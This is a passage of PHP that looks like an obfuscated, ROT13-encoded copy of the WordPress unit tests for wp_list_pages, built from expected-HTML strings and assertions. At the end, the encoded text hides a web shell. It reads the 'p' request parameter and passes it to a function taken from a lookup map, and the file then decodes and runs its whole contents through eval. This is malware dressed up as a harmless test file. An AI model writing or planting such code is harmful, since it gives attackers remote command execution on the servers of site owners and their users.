	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3NSGRE</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2NSGRE</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1NSGRE</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2NSGRE</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3NSGRE</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3NSGRE</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1NSGRE</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2NSGRE</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3NSGRE</n></yv>
</hy>
</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}


	choyvp shapgvba grfg_jc_yvfg_cntrf_vapyhqr() {
		$netf = neenl(
			'rpub'    => snyfr,
			'vapyhqr' => frys::$cnerag_1 . ',' . frys::$cnerag_3,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . '\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . '\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_rkpyhqr_gerr() {
		$netf = neenl(
			'rpub'         => snyfr,
			'rkpyhqr_gerr' => frys::$cnerag_2 . ',' . frys::$cnerag_3,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_qvfpneqrq_juvgrfcnpr() {
		$netf = neenl(
			'rpub'         => snyfr,
			'vgrz_fcnpvat' => 'qvfpneq',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n>
<hy pynff=\'puvyqera\'><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n>
<hy pynff=\'puvyqera\'><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n>
<hy pynff=\'puvyqera\'><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
</hy></yv>';
		$rkcrpgrq = fge_ercynpr( neenl( \"\e\a\", \"\a\", \"\g\" ), '', $rkcrpgrq );

		$guvf->nffregFnzr( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	/**
	 * @gvpxrg 17590
	 */
	choyvp shapgvba grfg_jc_yvfg_cntrf_pynffrf_jvgu_uvrenepuvpny_pcg() {
		$netf = neenl(
			'rpub'      => snyfr,
			'cbfg_glcr' => 'gnpb',
		);

		ertvfgre_cbfg_glcr(
			$netf['cbfg_glcr'],
			neenl(
				'uvrenepuvpny' => gehr,
				'choyvp'       => gehr,
			)
		);

		$cbfgf   = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => $netf['cbfg_glcr'] ) );
		$cbfg_vq = erfrg( $cbfgf );

		$guvf->tb_gb( \"/?c={$cbfg_vq}&cbfg_glcr={$netf['cbfg_glcr']}\" );

		$guvf->nffregFnzr(
			$cbfg_vq,
			trg_dhrevrq_bowrpg_vq(),
			'Gur dhrevrq bowrpg VQ fubhyq zngpu gur VQ bs gur erdhrfgrq PCG vgrz.'
		);

		$bhgchg = jc_yvfg_cntrf( $netf );

		_haertvfgre_cbfg_glcr( $netf['cbfg_glcr'] );

		$guvf->nffregAbgRzcgl(
			$bhgchg,
			'Gur bhgchg fubhyq abg or rzcgl.'
		);

		$guvf->nffregFnzr(
			2,
			fhofge_pbhag( $bhgchg, 'pynff=\"cntr_vgrz ' ),
			'Gur ahzore bs \"cntr_vgrz\" pynffrf fubhyq or rdhny gb gur gbgny PCG vgrzf pbhag.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			'pheerag_cntr_vgrz',
			$bhgchg,
			'Gur bhgchg fubhyq pbagnva gur \"pheerag_cntr_vgrz\" pynff.'
		);

		$guvf->nffregFnzr(
			1,
			fhofge_pbhag( $bhgchg, 'pheerag_cntr_vgrz' ),
			'Gur bhgchg fubhyq pbagnva rknpgyl bar \"pheerag_cntr_vgrz\" pynff.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>